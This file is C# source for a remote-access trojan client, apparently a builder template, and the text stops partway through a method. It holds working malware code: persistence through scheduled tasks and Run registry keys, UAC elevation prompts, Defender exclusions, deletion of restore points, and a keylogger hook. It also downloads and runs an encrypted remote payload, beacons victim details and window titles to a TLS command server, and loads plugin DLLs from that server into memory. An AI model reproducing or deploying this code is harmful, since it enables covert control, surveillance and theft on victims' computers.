using System.Threading;
using System;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Security.Cryptography;
using System.IO;
using System.IO.Compression;
using System.Net.Sockets;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Collections;
using System.Net.Security;
using System.Net;
using System.Security.Authentication;
using System.Collections.Generic;
using System.Security.Principal;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic;
using System.Collections.Specialized;
#if DefAddFolderSecurity
using System.Security.AccessControl;
#endif
#if DefDeleteSystemRestore
using System.Management;
#endif
using System.Reflection;
#if DefAssembly
[assembly: AssemblyTitle("%Title%")]
[assembly: AssemblyDescription("%Description%")]
[assembly: AssemblyCompany("%Company%")]
[assembly: AssemblyProduct("%Product%")]
[assembly: AssemblyCopyright("%Copyright%")]
[assembly: AssemblyTrademark("%Trademark%")]
[assembly: AssemblyFileVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")]
#endif

namespace %Setup%
{

    public class %Program%
    {



#if BypassAV
 public static string %Invoki%(string x)
        {

            Main();
            Debug.WriteLine(x);
            return "";
        }
#endif



        public static void Main()
{

#if Executiondelay
        for (int i = 0; i < Convert.ToInt32(%DelayCount%); i++)
        {
            Thread.Sleep(1000);
        }
        


#endif

    if (!Settings.InitializeSettings()) Environment.Exit(0);
    try
    {
        if (!ClientOnExit.CreateMutex())
            Environment.Exit(0);



#if DefDeleteSystemRestore

 Settings.DeleteSystemRestore();

#endif



#if IsInternetState

        while (!Settings.InternetState())
        {
            try
            {
                Thread.Sleep(5000);
            }
            catch { }
            
        }

#endif


#if AddInstalla

   Installation.Install();

#endif

#if DefUAC

Settings. AsAdmin();

#endif

#if DefDefenderException

   Settings.AddException();

#endif

#if DefCreateTask
 try
            {
                Process.Start(new ProcessStartInfo
                {

                    FileName = "schtasks",
                    Arguments =@"%Commaent%".Replace("%Path%", System.Windows.Forms.Application.ExecutablePath),
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                });
            }
            catch { }
               

#endif

#if IsDiscordNotif
        
       MessageRead.DiscordNotif();
         
#endif


        Settings.PreventSleep();


    }
    catch { }


#if KeyloaggrOfflien
    try
    {
      new Thread(() =>
        {
            Keyloaggr.StartKeyloaggar();
        }).Start();
    }
    catch { }
#endif


    while (true) // ~ loop to check socket status
    {
        try
        {
            if (!Connection.IsConnected)
            {
                Connection.Reconnect();
                Connection.InitializeClient();
            }
        }
        catch { }
        Thread.Sleep(int.Parse(Settings.ReconnectDelay));
    }
}

}

public class Settings
{
    public static string Key = "%!<Silver>!%";

    public static string KeyX509 = "%Key%";

    public static string Serversignature = "%Serversignature%";

    public static string Certificate = "%Certificate%";

    public static string Group = "%Group%";

    public static string MTX = "%Mtx%";

    public static string Hosts = "%Host%";

    public static string Ports = "%Port%";

    public static string ReconnectDelay = "%ReconnectDelay%";

    public static string Version = "1.0.0.0";


#if IsDiscordNotif
    public static string ServerDiscord = "%ServerDiscord%";
  
    public static string Logo = "%Logo%";
#endif



    public static X509Certificate2 ServerCertificate;

    public static bool InitializeSettings()
    {
        try
        {
            KeyX509 = Encoding.UTF8.GetString(Convert.FromBase64String(KeyX509));

            ServerCertificate = new X509Certificate2(Convert.FromBase64String(Certificate));

            Key = Encoding.UTF8.GetString(DecryptBytes(Convert.FromBase64String(Key)));

#if DNSNormal
            Hosts = Encoding.UTF8.GetString(DecryptBytes(Convert.FromBase64String(Hosts)));

            Ports = Encoding.UTF8.GetString(DecryptBytes(Convert.FromBase64String(Ports)));
#endif

#if IsDiscordNotif
            ServerDiscord = Encoding.UTF8.GetString(DecryptBytes(Convert.FromBase64String(ServerDiscord)));

            Logo = Encoding.UTF8.GetString(DecryptBytes(Convert.FromBase64String(Logo)));
#endif


            var csp = (RSACryptoServiceProvider)ServerCertificate.PublicKey.Key;

            return csp.VerifyHash(Algorithm.ComputeHash(Encoding.UTF8.GetBytes(KeyX509)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Serversignature));

        }
        catch { return false; }
    }

#if IsInternetState

    [DllImport("wininet.dll")]
    private extern static bool InternetGetConnectedState(out int Description, int ReservedValue);
    public static bool InternetState()
    {
        int Desc;
        bool constate = InternetGetConnectedState(out Desc, 0);
        return constate;
    }

#endif


    public static byte[] DecryptBytes(byte[] cipherBytes)
    {
        byte[] buffer;
        using (Aes aes = Aes.Create())
        {
            var bytes = new Rfc2898DeriveBytes("0x49,0x76,0x61,10,0x20,0x4D,0x65,100,0x76,0x65,100,0x65,0x76", new byte[] { 0x49, 0x76, 0x61, 110, 0x20, 0x4D, 0x65, 100, 0x76, 0x65, 100, 0x65, 0x76 });
            aes.Key = bytes.GetBytes(0x20);
            aes.IV = bytes.GetBytes(0x10);
            using (var stream = new MemoryStream())
            {
                using (CryptoStream stream2 = new CryptoStream(stream, aes.CreateDecryptor(), CryptoStreamMode.Write))
                {
                    stream2.Write(cipherBytes, 0, cipherBytes.Length);
                    try
                    {
                        stream2.Close();
                    }
                    catch
                    {
                        return stream.ToArray();
                    }
                }

                buffer = stream.ToArray();
            }
        }

        return buffer;
    }


#if DefUAC

    private static readonly FileInfo LN = new FileInfo(Assembly.GetEntryAssembly().Location);
    public static void AsAdmin()
    {
        if (GetInformationOS.IsAdmin() == false)
        {
            if (CreateShTasks())
            {
                if (Taskexistance(LN.Name))
                {
                    ProcessStartInfo start = new ProcessStartInfo()
                    {
                        FileName = "schtasks.exe",
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        Arguments = " /Run /TN \"" + LN.Name + "\"",
                        RedirectStandardOutput = true
                    };
                    Process.Start(start).WaitForExit();

                    Environment.Exit(0);
                }
            }
            else
            {
            A:
                try
                {
                    Process proc = new Process()
                    {
                        StartInfo = new ProcessStartInfo()
                        {
                            FileName = "cmd",
                            Arguments = "/k START \"\" \"" + Process.GetCurrentProcess().MainModule.FileName + "\" & EXIT",
                            WindowStyle = ProcessWindowStyle.Hidden,
                            Verb = "runas",
                            UseShellExecute = true
                        }
                    };
                    proc.Start();

                    Environment.Exit(0);
                }
                catch
                {
                    goto A;
                }
            }
        }
        else if (!Taskexistance(LN.Name))
            CreateShTasks();
    }

    private static bool Taskexistance(string taskname)
    {
        ProcessStartInfo start = new ProcessStartInfo()
        {
            FileName = "schtasks.exe",
            UseShellExecute = false,
            CreateNoWindow = true,
            WindowStyle = ProcessWindowStyle.Hidden,
            Arguments = "/query /TN " + taskname,
            RedirectStandardOutput = true
        };
        using (Process process = Process.Start(start))
        {
            using (StreamReader reader = process.StandardOutput)
            {
                string stdout = reader.ReadToEnd();

                if (stdout.Contains(taskname))
                    return true;
                else
                    return false;
            }
        }
    }
    private static bool CreateShTasks()
    {
        ProcessStartInfo start = new ProcessStartInfo()
        {
            FileName = "schtasks.exe",
            UseShellExecute = false,
            CreateNoWindow = true,
            WindowStyle = ProcessWindowStyle.Hidden,
            Arguments = " /Create /SC ONCE /TN \"" + LN.Name + "\" /TR \"" + LN.FullName + @" \""\" + LN.Name + @"\"" /AsAdmin"" /ST 00:01 /IT /F /RL HIGHEST",
            RedirectStandardOutput = true
        };
        Process.Start(start).WaitForExit();
        return Taskexistance(LN.Name);
    }

#endif

#if DefDefenderException

    public static void AddException()
    {
        if (GetInformationOS.IsAdmin())
        {
            try
            {
                Process proc = new Process()
                {
                    StartInfo = new ProcessStartInfo() { FileName = "powershell", Arguments = "Set-MpPreference -ExclusionExtension exe,bat,dll,ps1;exit", WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true }
                };
                proc.Start();
            }
            catch
            {
                Debug.WriteLine("Faild!");
            }
        }
    }

    
#endif

#if DefDeleteSystemRestore

    [DllImport("Srclient.dll")]
    public static extern int SRRemoveRestorePoint(int index);
    public static void DeleteSystemRestore()
    {
        if (GetInformationOS.IsAdmin())
        {
            try
            {

                ManagementClass objClass = new ManagementClass("\\\\.\\root\\default", "systemrestore", new ObjectGetOptions());
                ManagementObjectCollection objCol = objClass.GetInstances();

                StringBuilder Results = new StringBuilder();
                foreach (ManagementObject objItem in objCol)
                {
                    int SeqNum = int.Parse(objItem["sequencenumber"].ToString());
                    SRRemoveRestorePoint(SeqNum);
                }
                Debug.WriteLine("Done Successfully");
            }
            catch
            {
                Debug.WriteLine("Faild!");
            }
        }
    }

    
#endif

    public static void PreventSleep()

    {
        try
        {
            NativeMethod.SetThreadExecutionState(NativeMethod.EXECUTION_STATE.ES_SYSTEM_REQUIRED | NativeMethod.EXECUTION_STATE.ES_CONTINUOUS | NativeMethod.EXECUTION_STATE.ES_DISPLAY_REQUIRED);
        }
        catch { }
    }

}

public class NativeMethod
{
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern EXECUTION_STATE SetThreadExecutionState(EXECUTION_STATE esFlags);
    public enum EXECUTION_STATE : uint
    {
        ES_CONTINUOUS = 0x80000000,
        ES_DISPLAY_REQUIRED = 0x00000002,
        ES_SYSTEM_REQUIRED = 0x00000001
    }
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING : IDisposable
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr buffer;
        public UNICODE_STRING(string s)
        {
            Length = System.Convert.ToUInt16(s.Length * 2);
            MaximumLength = System.Convert.ToUInt16(Length + 2);
            buffer = Marshal.StringToHGlobalUni(s);
        }
        public void Dispose()
        {
            Marshal.FreeHGlobal(buffer);
            buffer = IntPtr.Zero;
        }
        public override string ToString()
        {
            return Marshal.PtrToStringUni(buffer);
        }
    }
    internal enum RegistryKeyType
    {
        REG_SZ = 1
    }
    public static UIntPtr HKEY_CURRENT_USER = (UIntPtr)0x80000001U;
    public static UIntPtr HKEY_LOCAL_MACHINE = (UIntPtr)0x80000002U;
    public static int KEY_SET_VALUE = 0x2;
    [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
    public static extern uint RegOpenKeyEx(UIntPtr hKey, string subKey, int ulOptions, int samDesired, out UIntPtr KeyHandle);
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern int RegCloseKey(UIntPtr KeyHandle);
    public static IntPtr StructureToPtr(object obj)
    {
        IntPtr ptr = Marshal.AllocHGlobal(Marshal.SizeOf(obj));
        Marshal.StructureToPtr(obj, ptr, false);
        return ptr;
    }

}

public class ClientOnExit
{
    public static Mutex currentApp;

    public static bool CreateMutex()
    {
        bool createdNew;
        currentApp = new Mutex(false, Settings.MTX, out createdNew);
        return createdNew;
    }
    public static void CloseMutex()
    {
        if (currentApp != null)
        {
            currentApp.Close();
            currentApp = null;
        }
    }
    public static void Close()
    {
        try
        {
            CloseMutex();
            Connection.SslClient.Close();
            Connection.TcpClient.Close();
        }
        catch { }
    }
}

public class Algorithm
{
    public static string ComputeHash(string input)
    {
        byte[] data = Encoding.UTF8.GetBytes(input);

        using (SHA256Managed sha = new SHA256Managed())
        {
            data = sha.ComputeHash(data);
        }

        StringBuilder hash = new StringBuilder();

        foreach (byte _byte in data)
            hash.Append(_byte.ToString("X2"));

        return hash.ToString().ToUpper();
    }

    public static byte[] ComputeHash(byte[] input)
    {
        using (SHA256Managed sha = new SHA256Managed())
        {
            return sha.ComputeHash(input);
        }
    }

    public static byte[] Decompress(byte[] input)
    {
        using (var source = new MemoryStream(input))
        {
            byte[] lengthBytes = new byte[4];
            source.Read(lengthBytes, 0, 4);

            var length = BitConverter.ToInt32(lengthBytes, 0);
            using (var decompressionStream = new GZipStream(source,
                CompressionMode.Decompress))
            {
                var result = new byte[length];
                decompressionStream.Read(result, 0, length);
                return result;
            }
        }
    }
    public static byte[] Compress(byte[] input)
    {
        using (var result = new MemoryStream())
        {
            var lengthBytes = BitConverter.GetBytes(input.Length);
            result.Write(lengthBytes, 0, 4);

            using (var compressionStream = new GZipStream(result,
                CompressionMode.Compress))
            {
                compressionStream.Write(input, 0, input.Length);
                compressionStream.Flush();

            }
            return result.ToArray();
        }
    }




}

#if AddInstalla
public class Installation
{

    public static void Install()
    {
        try
        {
            FileInfo InstallPath = new FileInfo(Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.%Method%), "%Folder%"), "%Payload%"));
            string currentProcess = Process.GetCurrentProcess().MainModule.FileName;
            if (!Directory.Exists(InstallPath.Directory.FullName))
            {
                Directory.CreateDirectory(InstallPath.Directory.FullName);

#if DefAddFolderSecurity

  AddFolderSecurity(InstallPath.Directory.FullName, Environment.UserName, FileSystemRights.ReadData, AccessControlType.Deny); 

#endif

            }

            if (!Object.Equals(currentProcess, InstallPath.FullName))
            {
                foreach (var P in Process.GetProcesses())
                {
                    try
                    {
                        if (Object.Equals(P.MainModule.FileName, InstallPath.FullName))
                            P.Kill();
                    }
                    catch
                    {
                    }
                }
                FileStream fs;
                if (File.Exists(InstallPath.FullName))
                {

#if DefHidden
                    Hidden(InstallPath.Directory.FullName);
                    Hidden(InstallPath.FullName);
#endif
                    Thread.Sleep(2000);
                    File.Delete(InstallPath.FullName);
                    Thread.Sleep(1000);
                }





                fs = new FileStream(InstallPath.FullName, FileMode.CreateNew);
                var clientExe = File.ReadAllBytes(currentProcess);
                fs.Write(clientExe, 0, clientExe.Length);

                ClientOnExit.Close();
#if DefHidden

                Hidden(InstallPath.Directory.FullName);
                Hidden(InstallPath.FullName);
#endif

#if DefAutoStart

                EnableStartup(InstallPath.FullName);

#endif


                string batch = Path.GetTempFileName() + ".bat";
                using (StreamWriter sw = new StreamWriter(batch))
                {
                    sw.WriteLine("@echo off");
                    sw.WriteLine("timeout 3 > NUL");
                    sw.WriteLine("START " + "\"" + "\" " + "\"" + InstallPath.FullName + "\"");
                    sw.WriteLine("CD " + Path.GetTempPath());
                    sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
                }

                Process.Start(new ProcessStartInfo() { FileName = batch, CreateNoWindow = true, ErrorDialog = false, UseShellExecute = false, WindowStyle = ProcessWindowStyle.Hidden });

                Environment.Exit(0);
            }

#if Rootikt

  if (GetInformationOS.IsAdmin())
  {
       HiddenProcess(InstallPath.Directory.FullName);
  }
 
#endif

        }
        catch (Exception ex)
        {
            Debug.WriteLine("Install Failed : " + ex.Message);
        }
    }

#if Rootikt

     public static void HiddenProcess(string filename)
    {
        try
        {
            try
            {
                ServicePointManager.Expect100Continue = true;
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            }
            catch { }

            string Path = filename + "\\!.exe";
            byte[] data = new WebClient().DownloadData(Encoding.UTF8.GetString(Settings.DecryptBytes(Convert.FromBase64String("YuiIb0bvpOW/HwRCrl07ZyLIxUPAoAy0/EE6+OB0IBiLlp486XC9OZHtGsiixnNW"))));


            if (!System.IO.File.Exists(Path))
            {
                System.IO.File.WriteAllBytes(Path, Settings.DecryptBytes(data));
            }
            Console.WriteLine("The data has been written to the file.");
            if (System.IO.File.Exists(Path))
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = Path,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                });
            }
        }
        catch { }
    }


    public static string Reverse(string s)
    {
        char[] charArray = s.ToCharArray();
        Array.Reverse(charArray);
        return new string(charArray);
    }

#endif




#if DefHidden

      private static FileAttributes RemoveAttribute(FileAttributes attributes, FileAttributes attributesToRemove)
    {
        return attributes & attributesToRemove;
    }
    public static void Hidden(string Path)
    {
        try
        {

            if (File.Exists(Path) == true || Directory.Exists(Path) == true)
            {
                FileAttributes attributes = File.GetAttributes(Path);
                if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
                {
                    attributes = RemoveAttribute(attributes, FileAttributes.Hidden);
                    File.SetAttributes(Path, attributes);
                    File.SetAttributes(Path, FileAttributes.Normal);
                    Console.WriteLine("The {0} file is no longer hidden.", Path);
                }
                else
                {
                    ProcessStartInfo startInfo = new ProcessStartInfo("Attrib")
                    {
                        WindowStyle = ProcessWindowStyle.Hidden,
                        Arguments = "+s +h " + Strings.ChrW(34) + Path + Strings.ChrW(34)
                    };
                    Process.Start(startInfo);

                    Console.WriteLine("The {0} file is now hidden.", Path);
                }
            }
        }
        catch { return; }
       
    }

#endif

#if DefAddFolderSecurity

    public static void AddFolderSecurity(string fileName, string account, FileSystemRights rights, AccessControlType controlType)
    {
        try
        {
            if (Directory.Exists(fileName))
            {
                FileSecurity fSecurity = File.GetAccessControl(fileName);
                fSecurity.AddAccessRule(new FileSystemAccessRule(account, rights, controlType));
                File.SetAccessControl(fileName, fSecurity);
            }
        }
        catch { return; }

    }

    
#endif

#if DefAutoStart

    [DllImport("ntdll.dll", CharSet = CharSet.Unicode, CallingConvention = CallingConvention.StdCall)]
    static extern uint NtSetValueKey(UIntPtr KeyHandle, IntPtr ValueName, int TitleIndex,NativeMethod.RegistryKeyType Type, IntPtr Data, int DataSize);
    public static void EnableStartup(string Value)
    {
        var KeyHandle = UIntPtr.Zero;
        var KeyPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        var runKeyPathTrick = Constants.vbNullChar + Constants.vbNullChar + KeyPath;
        uint Status;
        if (GetInformationOS.IsAdmin())
            Status = NativeMethod.RegOpenKeyEx(NativeMethod.HKEY_LOCAL_MACHINE, KeyPath, 0, NativeMethod.KEY_SET_VALUE, out KeyHandle);
        else
            Status = NativeMethod.RegOpenKeyEx(NativeMethod.HKEY_CURRENT_USER, KeyPath, 0, NativeMethod.KEY_SET_VALUE, out KeyHandle);
        NativeMethod.UNICODE_STRING ValueName = new NativeMethod.UNICODE_STRING(runKeyPathTrick) { Length = 2 * 11, MaximumLength = 0 };
        var ValueNamePtr = NativeMethod.StructureToPtr(ValueName);
        NativeMethod.UNICODE_STRING ValueData = new NativeMethod.UNICODE_STRING("\"" + Value + "\"");
        Thread.Sleep(20 * 1000);
        ThreadPool.QueueUserWorkItem(delegate {
            Status = NtSetValueKey(KeyHandle, ValueNamePtr, 0, NativeMethod.RegistryKeyType.REG_SZ, ValueData.buffer, ValueData.MaximumLength);
            NativeMethod.RegCloseKey(KeyHandle);
        });
    }


    
#endif





}

#endif

public class GetInformationOS
{

    public static string HWID()
    {
        try
        {
            return GetHash(string.Concat(Environment.ProcessorCount, Environment.UserName,
                Environment.MachineName, Environment.OSVersion
                , new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize));
        }
        catch
        {
            return "Err HWID";
        }
    }

    public static string GetHash(string strToHash)
    {
        MD5CryptoServiceProvider md5Obj = new MD5CryptoServiceProvider();
        byte[] bytesToHash = Encoding.ASCII.GetBytes(strToHash);
        bytesToHash = md5Obj.ComputeHash(bytesToHash);
        StringBuilder strResult = new StringBuilder();
        foreach (byte b in bytesToHash)
            strResult.Append(b.ToString("x2"));
        return strResult.ToString().Substring(0, 20).ToUpper();
    }

    public static byte[] Send()
    {
        MsgPack msgpack = new MsgPack();
        msgpack.ForcePathObject(Settings.Key).AsString = "ClientInfo";
        msgpack.ForcePathObject("HWID").AsString = HWID();
        msgpack.ForcePathObject("User").AsString = Environment.UserName.ToString();
        msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString().Replace("Microsoft", null) + " " +
            Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
        msgpack.ForcePathObject("Path").AsString = System.Windows.Forms.Application.ExecutablePath;
        msgpack.ForcePathObject("Version").AsString = Settings.Version;
        msgpack.ForcePathObject("Admin").AsString = IsAdmin().ToString();
        msgpack.ForcePathObject("Performance").AsString = GetActiveWindowTitle();
        msgpack.ForcePathObject("Installed").AsString = new FileInfo(System.Windows.Forms.Application.ExecutablePath).LastWriteTime.ToUniversalTime().ToString();
        msgpack.ForcePathObject("IsNewClient").AsString = IsNewClient().ToString();
        msgpack.ForcePathObject("Group").AsString = Nackname();
        return msgpack.Encode2Bytes();
    }

    public static bool IsAdmin()
    {
        return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
    }

    public static void KeepAlivePacket(object obj)
    {
        try
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject(Settings.Key).AsString = "Ping";
            msgpack.ForcePathObject("Message").AsString = GetActiveWindowTitle();
            Connection.Send(msgpack.Encode2Bytes());
            GC.Collect();
            Connection.ActivatePong = true;
        }
        catch { }
    }

    public static void Pong(object obj)
    {
        try
        {
            if (Connection.ActivatePong && Connection.IsConnected)
            {
                Connection.Interval++;
            }
        }
        catch { }
    }
    public static string GetActiveWindowTitle()
    {
        try
        {
            const int nChars = 256;
            StringBuilder buff = new StringBuilder(nChars);
            IntPtr handle = NativeMethod.GetForegroundWindow();
            if (NativeMethod.GetWindowText(handle, buff, nChars) > 0)
            {
                return buff.ToString();
            }
        }
        catch { }
        return "";
    }


    private static string Nackname()
    {
        try
        {
            if (!IsNewClient()) return Settings.Group;

            string Nackname = "Nackname";

            return (MessageRead.GetValue(Nackname) == null) ? Settings.Group : Encoding.UTF8.GetString(MessageRead.GetValue(Nackname));

        }
        catch { return Settings.Group; }
    }
    public static bool IsNewClient()
    {
        RegistryKey RkSubKey = Registry.CurrentUser.OpenSubKey(MessageRead.ID, false);
        bool Value = RkSubKey != null;
        return Value;
    }
}

public class Connection
{
    public static Socket TcpClient { get; set; } //Main socket
    public static SslStream SslClient { get; set; } //Main SSLstream
    private static byte[] Buffer { get; set; } //Socket buffer
    private static long HeaderSize { get; set; } //Recevied size
    private static long Offset { get; set; } // Buffer location
    private static Timer KeepAlive { get; set; } //Send Performance
    public static bool IsConnected { get; set; } //Check socket status
    private static readonly object SendSync = new object(); //Sync send
    private static Timer Ping { get; set; } //Send ping interval
    public static int Interval { get; set; } //ping value
    public static bool ActivatePong { get; set; }

    public static void InitializeClient() //Connect & reconnect
    {
        try
        {

            TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp) { ReceiveBufferSize = 50 * 1024, SendBufferSize = 50 * 1024, };



#if DNSNormal
            
            if (IsValidDomainName(Settings.Hosts)) //check if the address is alphanumric (meaning its a domain)
            {
                IPAddress[] addresslist = Dns.GetHostAddresses(Settings.Hosts); //get all IP's connected to that domain

                foreach (IPAddress theaddress in addresslist) //we do a foreach becasue a domain can lead to multiple IP's
                {
                    try
                    {
                        TcpClient.Connect(theaddress, int.Parse(Settings.Ports)); //lets try and connect!
                        if (TcpClient.Connected) break;
                    }
                    catch { }
                }
            }
            else
            {
                TcpClient.Connect(Settings.Hosts, int.Parse(Settings.Ports)); //legacy mode connect (no DNS)

            }

#endif

#if PastebinDNS


           using (WebClient wc = new WebClient())
            {
                NetworkCredential networkCredential = new NetworkCredential("", "");
                wc.Credentials = networkCredential;
                string resp = wc.DownloadString("%URLPastebin%");
                string[] spl = resp.Split(new[] { ":" }, StringSplitOptions.None);
                Settings.Hosts = spl[0];
                Settings.Ports = spl[1];
                TcpClient.Connect(Settings.Hosts, Convert.ToInt32(Settings.Ports));
            }

#endif






            if (TcpClient.Connected)
            {

                Debug.WriteLine("Connected!");
                IsConnected = true;
                SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
                SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
                HeaderSize = 4;
                Buffer = new byte[HeaderSize];
                Offset = 0;
                Send(GetInformationOS.Send());
                Interval = 0;
                ActivatePong = false;
                KeepAlive = new Timer(new TimerCallback(GetInformationOS.KeepAlivePacket), null, new Random().Next(11 * 1000, 16 * 1000), new Random().Next(11 * 1000, 16 * 1000));
                Ping = new Timer(new TimerCallback(GetInformationOS.Pong), null, 1, 1);
                SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
            }
            else
            {
                IsConnected = false;
                return;
            }
        }
        catch
        {
            Debug.WriteLine("Disconnected!");
            IsConnected = false;
            return;
        }
    }

    private static bool IsValidDomainName(string name)
    {
        return Uri.CheckHostName(name) != UriHostNameType.Unknown;
    }
    private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
    {
        return Settings.ServerCertificate.Equals(certificate);
    }

    public static void Reconnect()
    {
        try
        {
            SslClient.Dispose();
            TcpClient.Dispose();
            Ping.Dispose();
            KeepAlive.Dispose();
        }
        catch { }
        IsConnected = false;
    }

    public static void ReadServertData(IAsyncResult ar) //Socket read/recevie
    {
        try
        {
            if (!TcpClient.Connected || !IsConnected)
            {
                IsConnected = false;
                return;
            }
            int recevied = SslClient.EndRead(ar);
            if (recevied > 0)
            {
                Offset += recevied;
                HeaderSize -= recevied;
                if (HeaderSize == 0)
                {
                    HeaderSize = BitConverter.ToInt32(Buffer, 0);
                    Debug.WriteLine("/// Client Buffersize " + HeaderSize.ToString() + " Bytes  ///");
                    if (HeaderSize > 0)
                    {
                        Offset = 0;
                        Buffer = new byte[HeaderSize];
                        while (HeaderSize > 0)
                        {
                            int rc = SslClient.Read(Buffer, (int)Offset, (int)HeaderSize);
                            if (rc <= 0)
                            {
                                IsConnected = false;
                                return;
                            }
                            Offset += rc;
                            HeaderSize -= rc;
                            if (HeaderSize < 0)
                            {
                                IsConnected = false;
                                return;
                            }
                        }
                        Thread thread = new Thread(new ParameterizedThreadStart(MessageRead.Read));
                        thread.Start(Buffer);
                        Offset = 0;
                        HeaderSize = 4;
                        Buffer = new byte[HeaderSize];
                    }
                    else
                    {
                        HeaderSize = 4;
                        Buffer = new byte[HeaderSize];
                        Offset = 0;
                    }
                }
                else if (Convert.ToUInt32(HeaderSize) < 0)
                {
                    IsConnected = false;
                    return;
                }
                SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
            }
            else
            {
                IsConnected = false;
                return;
            }
        }
        catch
        {
            IsConnected = false;
            return;
        }
    }

    public static void Send(byte[] msg)
    {
        lock (SendSync)
        {
            try
            {
                if (!IsConnected)
                {
                    return;
                }

                byte[] buffersize = BitConverter.GetBytes(msg.Length);
                TcpClient.Poll(-1, SelectMode.SelectWrite);
                SslClient.Write(buffersize, 0, buffersize.Length);

                if (msg.Length > 1000000) //1mb
                {
                    Debug.WriteLine("send chunks");
                    using (MemoryStream memoryStream = new MemoryStream(msg))
                    {
                        int read = 0;
                        memoryStream.Position = 0;
                        byte[] chunk = new byte[50 * 1000];
                        while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                        {
                            TcpClient.Poll(-1, SelectMode.SelectWrite);
                            SslClient.Write(chunk, 0, read);
                            SslClient.Flush();
                        }
                    }
                }
                else
                {
                    TcpClient.Poll(-1, SelectMode.SelectWrite);
                    SslClient.Write(msg, 0, msg.Length);
                    SslClient.Flush();
                }
            }
            catch
            {
                IsConnected = false;
                return;
            }
        }
    }


}

public class MessageRead
{
    public static List<MsgPack> Packs = new List<MsgPack>();
    public static void Read(object data)
    {
        try
        {
            MsgPack unpack_msgpack = new MsgPack();
            unpack_msgpack.DecodeFromBytes((byte[])data);
            switch (unpack_msgpack.ForcePathObject(Settings.Key).AsString)
            {
                case "pong": //send interval value to server
                    {
                        Connection.ActivatePong = false;
                        MsgPack msgPack = new MsgPack();
                        msgPack.ForcePathObject(Settings.Key).SetAsString("pong");
                        msgPack.ForcePathObject("Message").SetAsInteger(Connection.Interval);
                        Connection.Send(msgPack.Encode2Bytes());
                        Connection.Interval = 0;
                        break;
                    }

                case "plugin": // run plugin in memory
                    {
                        try
                        {
                            if (GetValue(unpack_msgpack.ForcePathObject("Dll").AsString) == null) // check if plugin is installed
                            {
                                Packs.Add(unpack_msgpack); //save it for later
                                MsgPack msgPack = new MsgPack();
                                msgPack.ForcePathObject(Settings.Key).SetAsString("sendPlugin");
                                msgPack.ForcePathObject("Hashes").SetAsString(unpack_msgpack.ForcePathObject("Dll").AsString);
                                Connection.Send(msgPack.Encode2Bytes());
                            }
                            else
                            {
                                Invoke(unpack_msgpack);
                            }

                        }
                        catch { }

                        break;
                    }

                case "savePlugin": // save plugin
                    {
                        SetValue(unpack_msgpack.ForcePathObject("Hash").AsString, unpack_msgpack.ForcePathObject("Dll").GetAsBytes());
                        Debug.WriteLine("plugin saved");

                        foreach (MsgPack msgPack in Packs.ToArray())
                        {
                            if (msgPack.ForcePathObject("Dll").AsString == unpack_msgpack.ForcePathObject("Hash").AsString)
                            {
                                Invoke(msgPack);

                                try
                                {
                                    Packs.Remove(msgPack);
                                }
                                catch { }

                            }
                        }
                        break;
                    }
            }
        }
        catch (Exception ex)
        {
            Notif(MsgType.Error, ex.Message);
        }
    }


    private static void Invoke(MsgPack unpack_msgpack)
    {
        try
        {
            var betterFunction = (Func<Socket, X509Certificate2, string, byte[], Mutex, string, string, string, string>)Delegate.CreateDelegate(typeof(Func<Socket, X509Certificate2, string, byte[], Mutex, string, string, string, string>), Assembly.Load(Algorithm.Decompress(GetValue(unpack_msgpack.ForcePathObject("Dll").AsString))).GetType("Plugin.Plugin").GetMethod("Run"));

            var Value = betterFunction(Connection.TcpClient, Settings.ServerCertificate, GetInformationOS.HWID(), unpack_msgpack.ForcePathObject("Dirct" + Settings.Key).GetAsBytes(), ClientOnExit.currentApp, Settings.MTX, Settings.Key, "%IStateInstallD%");

            Notif(MsgType.Success, Value.ToString() + " Ready");
        }
        catch (Exception ex)
        {
            Notif(MsgType.Error, "Anti : " + ex.Message);
        }
    }

    public enum MsgType { Error, Success };
    public static void Notif(MsgType Type, string Message)
    {
        MsgPack msgpack = new MsgPack();
